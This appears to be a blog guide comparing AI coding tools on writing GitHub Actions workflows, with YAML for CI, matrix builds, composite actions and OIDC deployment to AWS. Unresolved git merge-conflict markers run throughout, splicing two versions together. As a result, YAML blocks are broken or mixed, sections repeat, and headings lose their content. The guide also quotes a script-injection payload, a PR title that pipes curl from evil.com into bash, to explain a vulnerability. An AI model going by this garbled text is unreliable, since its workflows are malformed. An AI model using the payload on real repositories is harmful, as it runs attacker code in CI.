---
layout: default
title: "Best AI Tools for Writing GitHub Actions"
description: "Compare Claude Code, Copilot, and Cursor for writing GitHub Actions — security hardening, matrix builds, composite actions, and OIDC auth patterns"
date: 2026-03-22
author: theluckystrike
permalink: /ai-tools-for-writing-github-actions-guide/
categories: [guides]
reviewed: true
score: 8
intent-checked: true
voice-checked: true
tags: [ai-tools-compared]
---

{% raw %}

GitHub Actions YAML looks simple but has a long tail of security and reliability pitfalls: script injection via `${{ github.event.pull_request.title }}`, overly broad permissions, missing timeout settings, and cache invalidation issues. AI tools vary significantly in how well they handle these production-grade concerns.

## Key Takeaways

- **Topics covered**: the security gap, task 1: full ci pipeline with security, task 2: oidc authentication (keyless aws access)
- **Practical guidance included**: Step-by-step setup and configuration instructions
- **Use-case recommendations**: Specific guidance based on team size and requirements
- **Trade-off analysis**: Strengths and limitations of each option discussed

## Prerequisites

Before you begin, make sure you have the following ready:

- A computer running macOS, Linux, or Windows
- Terminal or command-line access
- Administrator or sudo privileges (for system-level changes)
- A stable internet connection for downloading tools

<<<<<<< HEAD

### Step 1: The Security Gap

This is where the tools diverge most. A 2026 GitHub security advisory found that script injection via `github.event` context is the number one CI vulnerability. Only Claude consistently flags it without prompting.

A vulnerable pattern looks like this:

```yaml
# VULNERABLE — do not use
- name: Print PR title
  run: echo "PR title: ${{ github.event.pull_request.title }}"
# An attacker can create a PR with title: "; curl evil.com | bash;"
=======
**Prompt:**
```text
Write a GitHub Actions workflow for a Node.js monorepo. Requirements:
- Matrix build across Node 18, 20, 22 and ubuntu-latest, windows-latest
- Cache node_modules based on package-lock.json hash
- Run tests with coverage, upload coverage to Codecov
- On push to main only: build Docker image, push to ECR using OIDC (no stored AWS keys)
- Fail fast: false for the matrix
- Concurrency: cancel in-progress runs on the same branch
# Best AI Tools for Writing GitHub Actions

GitHub Actions YAML is verbose and error-prone. Security hardening, matrix builds, composite actions, and OIDC authentication patterns are tedious to write manually. AI tools excel at generating the boilerplate and catching common mistakes like insecure checkout practices or missing permissions.

## Basic Workflow Generation

**Prompt to Claude:**
```text
Write a GitHub Actions workflow that:
- Triggers on push to main and pull requests
- Runs on ubuntu-latest
- Checks out code, sets up Node.js 20, installs dependencies with npm ci
- Runs linting and tests
- Only builds on main branch
Use strict permissions: contents read, checks write.
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
```

Claude automatically rewrites this to the safe environment variable pattern:

```yaml
# Claude's secure version
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # Environment variables are sanitized — no injection risk
```

Copilot and Cursor both miss this class of vulnerability in testing. They will reproduce the injection-vulnerable pattern from examples without flagging it.

### Step 2: Task 1: Full CI Pipeline with Security

**Prompt:** "Write a CI pipeline for a Python project that runs tests, checks coverage, and builds a Docker image."

**Copilot's output (simplified):**

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest
      - run: docker build -t myapp .
      - run: docker push myapp
        env:
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
```

Missing: permissions, timeout, caching, and Docker credentials are handled insecurely (mixing with plaintext).

**Claude's output:**
```yaml
name: CI

on:
<<<<<<< HEAD
  push:
branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read        # Minimum required for checkout
  packages: write       # Only for GHCR push job
  id-token: write       # Only for OIDC-based auth

jobs:
  test:
    name: Test and Coverage
    runs-on: ubuntu-latest
    timeout-minutes: 15   # Prevent hung builds

    strategy:
      matrix:
        python-version: ['3.11', '3.12']
    steps:
      - uses: actions/checkout@v4

- name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Cache pip packages
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ matrix.python-version }}-${{ hashFiles('requirements*.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-${{ matrix.python-version }}-

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt -r requirements-dev.txt

      - name: Run tests with coverage
        run: |
          pytest --cov=src --cov-report=xml --cov-fail-under=80 -v

      - name: Upload coverage report
        uses: codecov/codecov-action@v4
        if: matrix.python-version == '3.12'
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          fail_ci_if_error: false

  build-image:
    name: Build Docker Image
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 20
    if: github.ref == 'refs/heads/main'

    permissions:
      contents: read
      packages: write
=======
 push:
 branches: [main, 'release/**']
 pull_request:
 branches: [main]

concurrency:
 group: ${{ github.workflow }}-${{ github.ref }}
 cancel-in-progress: true

jobs:
 test:
 name: Test (Node ${{ matrix.node-version }} / ${{ matrix.os }})
 runs-on: ${{ matrix.os }}
 strategy:
 fail-fast: false
 matrix:
 node-version: ['18', '20', '22']
 os: [ubuntu-latest, windows-latest]
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41

 steps:
 - uses: actions/checkout@v4

<<<<<<< HEAD
      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata for Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,prefix=sha-
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

Claude added: `timeout-minutes`, `permissions` scoped to minimum required, `cache-from/to: type=gha` for Docker layer caching, and used `GITHUB_TOKEN` instead of a stored Docker password for GHCR.

### Step 3: Task 2: OIDC Authentication (Keyless AWS Access)

**Prompt:** "Write a GitHub Action that deploys to AWS using OIDC (no stored credentials)."

```yaml
name: Deploy to AWS

on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: production
    steps:
      - uses: actions/checkout@v4
=======
 - name: Setup Node.js ${{ matrix.node-version }}
 uses: actions/setup-node@v4
 with:
 node-version: ${{ matrix.node-version }}
 cache: npm

 - name: Install dependencies
 run: npm ci

 - name: Run tests with coverage
 run: npm run test:coverage

 - name: Upload coverage to Codecov
 if: matrix.os == 'ubuntu-latest' && matrix.node-version == '20'
 uses: codecov/codecov-action@v4
 with:
 token: ${{ secrets.CODECOV_TOKEN }}
 fail_ci_if_error: true

 build-and-push:
 name: Build and Push to ECR
 needs: test
 if: github.ref == 'refs/heads/main' && github.event_name == 'push'
 runs-on: ubuntu-latest
 permissions:
 id-token: write # Required for OIDC
 contents: read
name: Tests and Linting
on:
 push:
 branches: [main]
 pull_request:

permissions:
 contents: read
 checks: write
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41

jobs:
 test:
 runs-on: ubuntu-latest
 steps:
 - uses: actions/checkout@v4
 with:
 fetch-depth: 0 # full history for better linting

 - uses: actions/setup-node@v4
 with:
 node-version: '20'
 cache: 'npm'

 - run: npm ci
 - run: npm run lint
 - run: npm test

 build:
 runs-on: ubuntu-latest
 if: github.ref == 'refs/heads/main'
 needs: test
 steps:
 - uses: actions/checkout@v4
 - uses: actions/setup-node@v4
 with:
 node-version: '20'
 cache: 'npm'
 - run: npm ci
 - run: npm run build
 - uses: actions/upload-artifact@v4
 with:
 name: dist
 path: dist/
```

Claude adds `fetch-depth: 0` (needed by some linters), uses `npm ci` instead of `npm install` (correct for CI), and includes the `cache: 'npm'` line that saves ~30 seconds per run. It also sets strict permissions instead of the default `contents: write`.

## Matrix Builds

**Prompt:**
```text
Write a GitHub Actions matrix build for a Python package.
Test on Python 3.9, 3.10, 3.11, 3.12 and OS: ubuntu-latest, windows-latest, macos-latest.
Skip Python 3.9 on Windows (not supported). Use uv for dependency management.
Include coverage report upload to Codecov.
```

**Claude output:**

```yaml
name: Matrix Tests
on: [push, pull_request]

permissions:
 contents: read

jobs:
 test:
 strategy:
 matrix:
 os: [ubuntu-latest, windows-latest, macos-latest]
 python-version: ['3.9', '3.10', '3.11', '3.12']
 exclude:
 - os: windows-latest
 python-version: '3.9'

 runs-on: ${{ matrix.os }}
 steps:
 - uses: actions/checkout@v4

 - uses: astral-sh/setup-uv@v2
 with:
 python-version: ${{ matrix.python-version }}

 - run: uv sync
 - run: uv run pytest --cov=src tests/
 - run: uv run coverage xml

 - uses: codecov/codecov-action@v3
 with:
 files: coverage.xml
 flags: unittests
 os: ${{ matrix.os }}
 python-version: ${{ matrix.python-version }}
```

Claude uses `exclude` to skip the 3.9-on-Windows combination and includes `python-version` in the Codecov upload flags so reports are grouped correctly.

## Composite Actions (Reusable Steps)

**Prompt:**
```text
Write a composite GitHub Action that:
- Checks out the code
- Sets up Node.js with npm cache
- Installs dependencies
- Runs ESLint and Prettier

The action should accept inputs: node-version (default 20), and cache-enabled (default true).
Use it from a main workflow.
```

**Claude output (action.yml):**

```yaml
name: Setup and Lint
description: Check out, install, and lint a Node.js project
inputs:
 node-version:
 description: Node.js version
 required: false
 default: '20'
 cache-enabled:
 description: Enable npm cache
 required: false
 default: 'true'

runs:
 using: composite
 steps:
 - uses: actions/checkout@v4

 - uses: actions/setup-node@v4
 with:
 node-version: ${{ inputs.node-version }}
 cache: ${{ inputs.cache-enabled == 'true' && 'npm' || '' }}

 - run: npm ci
 shell: bash

 - run: npm run lint
 shell: bash

 - run: npm run format:check
 shell: bash
```

**Usage in main workflow:**

```yaml
jobs:
 check:
 runs-on: ubuntu-latest
 steps:
 - uses: ./.github/actions/setup-and-lint
 with:
 node-version: '20'
 cache-enabled: 'true'
```

Claude correctly uses `shell: bash` in composite actions (required) and shows how to conditionally set the cache parameter.

## OIDC Authentication and Token Exchange

**Prompt:**
```text
Write a GitHub Actions workflow that:
- Authenticates to AWS using OIDC (no static credentials)
- Assumes a role with proper trust policy
- Pushes a Docker image to ECR
Include the AWS trust policy configuration.
```

**Claude output (workflow):**

```yaml
name: Build and Push to ECR
on:
 push:
 branches: [main]

permissions:
 id-token: write
 contents: read

env:
 AWS_REGION: us-east-1
 ECR_REGISTRY: 123456789.dkr.ecr.us-east-1.amazonaws.com
 ECR_REPOSITORY: myapp

jobs:
 build:
 runs-on: ubuntu-latest
 outputs:
 image: ${{ steps.image.outputs.image }}

 steps:
 - uses: actions/checkout@v4

 - name: Configure AWS credentials via OIDC
 uses: aws-actions/configure-aws-credentials@v4
 with:
 role-to-assume: ${{ secrets.AWS_ECR_ROLE_ARN }}
 aws-region: ${{ vars.AWS_REGION }}

 - name: Login to Amazon ECR
 id: login-ecr
 uses: aws-actions/amazon-ecr-login@v2

 - name: Build and push Docker image
 env:
 REGISTRY: ${{ steps.login-ecr.outputs.registry }}
 REPOSITORY: my-app
 IMAGE_TAG: ${{ github.sha }}
 run: |
 docker build \
 --label "git-commit=${{ github.sha }}" \
 --label "built-by=github-actions" \
 -t $REGISTRY/$REPOSITORY:$IMAGE_TAG \
 -t $REGISTRY/$REPOSITORY:latest \
 .
 docker push $REGISTRY/$REPOSITORY:$IMAGE_TAG
 docker push $REGISTRY/$REPOSITORY:latest
```

Key things Claude gets right automatically:
- `permissions: id-token: write` is required for OIDC — omitting it causes a silent 403
- Coverage upload only on one matrix combination to avoid duplicate Codecov reports
- `cancel-in-progress: true` prevents queue buildup on busy branches
- `npm ci` instead of `npm install` for reproducible installs

## Copilot for GitHub Actions

Copilot (inline in VS Code) generates structurally valid workflows but misses security-critical details. In testing, it:
- Omits `permissions` blocks entirely, relying on over-broad default token permissions
- Uses `npm install` instead of `npm ci`
- Doesn't set `fail-fast: false` unless asked
- Generates OIDC setup incorrectly, missing the `id-token: write` permission

For simple single-job workflows, Copilot is fine. For anything involving credentials or matrix builds, it requires significant manual review.

## Composite Actions: Reusable Workflow Patterns

Claude handles reusable workflows and composite actions well. Here's a composite action for shared build steps:

```yaml
# .github/actions/setup-and-build/action.yml
name: Setup and Build
description: Install dependencies and build the project

inputs:
<<<<<<< HEAD
  node-version:
    description: Node.js version to use
    required: false
    default: '20'
  working-directory:
    description: Directory containing package.json    required: false
    default: '.'

outputs:
  cache-hit:
description: 'Whether the node_modules cache was hit'
    value: ${{ steps.cache-modules.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
- name: Get package lock hash
      id: hash
      shell: bash
      run: |
        echo "lockfile-hash=$(sha256sum ${{ inputs.working-directory }}/package-lock.json | cut -d' ' -f1)" >> $GITHUB_OUTPUT

    - name: Cache node_modules
      id: cache-modules
      uses: actions/cache@v4
      with:
        path: ${{ inputs.working-directory }}/node_modules
        key: ${{ runner.os }}-node-${{ inputs.node-version }}-${{ steps.hash.outputs.lockfile-hash }}
        restore-keys: |
          ${{ runner.os }}-node-${{ inputs.node-version }}-

    - name: Install dependencies
      if: steps.cache-modules.outputs.cache-hit != 'true'
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: npm ci --prefer-offline
=======
 node-version:
 description: Node.js version to use
 required: false
 default: '20'
 working-directory:
 description: Directory containing package.json
 required: false
 default: '.'

outputs:
 cache-hit:
 description: Whether the cache was restored
 value: ${{ steps.cache.outputs.cache-hit }}

runs:
 using: composite
 steps:
 - name: Setup Node.js
 uses: actions/setup-node@v4
 with:
 node-version: ${{ inputs.node-version }}
 cache: npm
 cache-dependency-path: ${{ inputs.working-directory }}/package-lock.json

 - name: Install dependencies
 shell: bash
 working-directory: ${{ inputs.working-directory }}
 run: npm ci

 - name: Build
 shell: bash
 working-directory: ${{ inputs.working-directory }}
 run: npm run build
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
```

Copilot generated a similar composite action but omitted the `outputs` section and used `npm install` instead of `npm ci`. In CI environments, `npm ci` is always preferred: it installs exactly what is in the lockfile, errors on lockfile mismatch, and is faster because it skips the dependency resolution step.

## Tool Comparison

| Pattern | Claude Code | Copilot | Cursor |
|---|---|---|---|
| Script injection prevention | Flags proactively | Misses it | Misses it |
| Permissions scoping | Minimum required | write-all or missing | Partial |
| OIDC auth | Correct with IAM policy | Stored credentials | Stores credentials |
| Composite actions | Full with outputs | Missing outputs | Partial |
| timeout-minutes | Always includes | Often missing | Sometimes includes |
| Docker layer caching | type=gha | Basic or missing | Basic |

## Workflow Patterns AI Tools Frequently Get Wrong

Even beyond the security gap, there are workflow patterns that AI tools consistently handle poorly.

### Concurrency Control

Without explicit concurrency settings, multiple pushes to the same branch queue parallel runs, which wastes runner minutes and causes deployment race conditions. Claude adds this automatically; the other tools rarely do:

```yaml
<<<<<<< HEAD
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
=======
# Pin all actions to full commit SHA, not tags
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# Minimal permissions — override per-job
permissions:
 contents: read

# Prevent script injection via environment variables
- name: Process user input safely
 env:
 USER_INPUT: ${{ github.event.pull_request.title }}
 run: |
 # Never interpolate github context directly into run commands
 echo "PR title length: ${#USER_INPUT}"
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
```

For production deploys you typically want `cancel-in-progress: false` so an in-flight deployment finishes before the next starts. Claude understands this distinction when you explain the use case.

### Pinned vs Floating Action Versions

Using `actions/checkout@v4` is convenient but means your workflow behavior can silently change when the action maintainer pushes a new commit to that tag. The more secure pattern pins to the full commit SHA:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Claude will suggest SHA pinning when asked about supply chain security. Copilot defaults to tag references without flagging the risk.

### Environment Protection Rules

Claude is the only tool tested that proactively suggests setting up GitHub Environment protection rules for production deployments. The `environment` key requires a designated reviewer to approve before the deploy job runs:

```yaml
jobs:
<<<<<<< HEAD
  deploy:
    environment:
      name: production
      url: https://yourapp.com
=======
 generate-matrix:
 runs-on: ubuntu-latest
 outputs:
 matrix: ${{ steps.set-matrix.outputs.matrix }}
 steps:
 - uses: actions/checkout@v4
 - id: set-matrix
 run: |
 # Build matrix dynamically from changed services
 SERVICES=$(git diff --name-only HEAD~1 HEAD | grep '^services/' | cut -d/ -f2 | sort -u | jq -R . | jq -sc .)
 echo "matrix={\"service\":$SERVICES}" >> $GITHUB_OUTPUT

 build-services:
 needs: generate-matrix
 if: ${{ needs.generate-matrix.outputs.matrix != '{"service":[]}' }}
 strategy:
 matrix: ${{ fromJson(needs.generate-matrix.outputs.matrix) }}
 runs-on: ubuntu-latest
 steps:
 - uses: actions/checkout@v4
 - name: Build ${{ matrix.service }}
 run: docker build services/${{ matrix.service }}
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
```

Without this, any push to main triggers an immediate deploy with no approval gate.

<<<<<<< HEAD
## When to Use Each Tool
=======
- [AI-Powered CI/CD Pipeline Optimization](/ai-powered-cicd-pipeline-optimization-2026/)
- [Best AI Tools for Writing Makefiles](/best-ai-tools-for-writing-makefiles-2026/)
- [AI Tools for Automated Migration Testing](/ai-tools-for-automated-migration-testing-2026/)
- [AI Tools for Writing GitHub Actions Workflows (2026)](/ai-tools-compared/ai-tools/best-ai-tools-for-github-actions-workflows/)
          role-to-assume: arn:aws:iam::123456789:role/github-actions-role
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to Amazon ECR
        run: aws ecr get-login-password --region ${{ env.AWS_REGION }} | docker login --username AWS --password-stdin ${{ env.ECR_REGISTRY }}

      - name: Build Docker image
        run: docker build -t ${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:${{ github.sha }} .

      - name: Push to ECR
        id: image
        run: |
          docker push ${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:${{ github.sha }}
          echo "image=${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:${{ github.sha }}" >> $GITHUB_OUTPUT
```

**AWS IAM Trust Policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

Claude includes the `id-token: write` permission (required for OIDC) and shows the correct trust policy syntax with both `aud` and `sub` conditions.

## Secrets Management Best Practices

**Prompt:**
```text
Show me how to:
- Use GitHub Secrets in a workflow
- Encrypt sensitive data
- Pass secrets to Docker builds without exposing in logs
- Rotate secrets safely
```

Claude's explanation includes:

```bash
# In your workflow, use ${{ secrets.SECRET_NAME }}
# GitHub automatically masks the value in logs

# For Docker build secrets (BuildKit):
docker build \
  --secret DATABASE_PASSWORD \
  --build-arg REGISTRY_URL=${{ secrets.REGISTRY_URL }} \
  .

# Dockerfile (with buildkit syntax):
# syntax=docker/dockerfile:1
FROM ubuntu
RUN --mount=type=secret,id=DATABASE_PASSWORD \
  cat /run/secrets/DATABASE_PASSWORD
```

Never echo secrets or print them to logs. GitHub masks known secrets but not dynamic ones. Rotate regularly — set an expiration date for long-lived secrets.

## Tool Comparison

| Task | Claude | ChatGPT |
|------|--------|---------|
| Basic workflows | Excellent | Excellent |
| Matrix builds with exclusions | Handles correctly | Sometimes wrong |
| Composite action inputs | Correct shell handling | Omits shell directive |
| OIDC trust policy JSON | Accurate syntax | Incomplete |
| Permission scoping | Strict (reads=read, checks=write) | Often too permissive |
| Secrets handling | Honest about limitations | Sometimes unsafe advice |
| Caching (npm, pip, etc) | Includes by default | Sometimes omitted |

## Common Mistakes to Avoid

Claude catches these automatically:
- Using `actions/checkout@v3` (old) instead of `v4`
- Running `npm install` in CI (use `npm ci`)
- Using `permissions: write-all` (overly permissive)
- Forgetting `id-token: write` for OIDC workflows
- Using `pull_request` without specifying `branches:` on `push` (triggers on every branch)

## Related Reading

- [Best AI Tools for Writing GitHub Actions Matrix Build Strategies](/ai-tools-compared/best-ai-tools-for-writing-github-actions-matrix-build-strate/)
- [Best AI Tools for Writing Kubernetes Custom Resource Definitions](/ai-tools-compared/best-ai-tools-for-writing-kubernetes-custom-resource-definitions-2026/)
- [AI Assistants for Writing Correct AWS IAM Policies](/ai-tools-compared/ai-assistants-for-writing-correct-aws-iam-policies-with-least-privilege/)

---
>>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41

**Use Claude Code** when writing a new workflow from scratch where security matters. It produces complete, production-hardened YAML in a single pass. The security defaults — OIDC, permission scoping, injection prevention — are included without prompting.

**Use Copilot** for quick edits to existing workflows inside VS Code. It is fast and context-aware about your local files, which helps when adding a step that references a local script or Dockerfile. For new workflows, verify it against a security checklist before merging.

**Use Cursor** when iterating rapidly and wanting an in-editor chat to explain why a step is failing. Cursor's ability to read error logs and suggest fixes is its strongest feature for CI debugging. Its security defaults are not reliable enough to use unreviewed in production.

## Troubleshooting

**Configuration changes not taking effect**

Restart the relevant service or application after making changes. Some settings require a full system reboot. Verify the configuration file path is correct and the syntax is valid.

**Permission denied errors**

Run the command with `sudo` for system-level operations, or check that your user account has the necessary permissions. On macOS, you may need to grant terminal access in System Settings > Privacy and Security.

**OIDC credentials error: Could not assume role**

Verify that the OIDC provider `token.actions.githubusercontent.com` is registered in your AWS account under IAM > Identity providers. The trust policy `sub` condition must exactly match your repo path and branch: `repo:org/repo:ref:refs/heads/main`.

**Cache not restoring between runs**

The cache key must be deterministic. If your lock file changes between runs (e.g., a bot auto-updates dependencies), use `restore-keys` as a fallback. Caches are scoped to the branch — a cache created on `main` is available to PRs, but not vice versa.

**Connection or network-related failures**

Check your internet connection and firewall settings. If using a VPN, try disconnecting temporarily to isolate the issue. Verify that the target server or service is accessible from your network.

## Related Reading

- [Best AI Tools for Writing GitHub Actions Workflows](/ai-tools-compared/best-ai-tools-for-writing-github-actions-workflows-2026/)
- [AI Tools for Automated PR Description Generation](/ai-tools-compared/ai-tools-for-automated-pr-description-generation/)
- [Claude Code Hooks and Custom Workflows Guide](/ai-tools-compared/claude-code-hooks-and-custom-workflows-guide/)

---
Built by theluckystrike — More at [zovo.one](https://zovo.one)
{% endraw %}
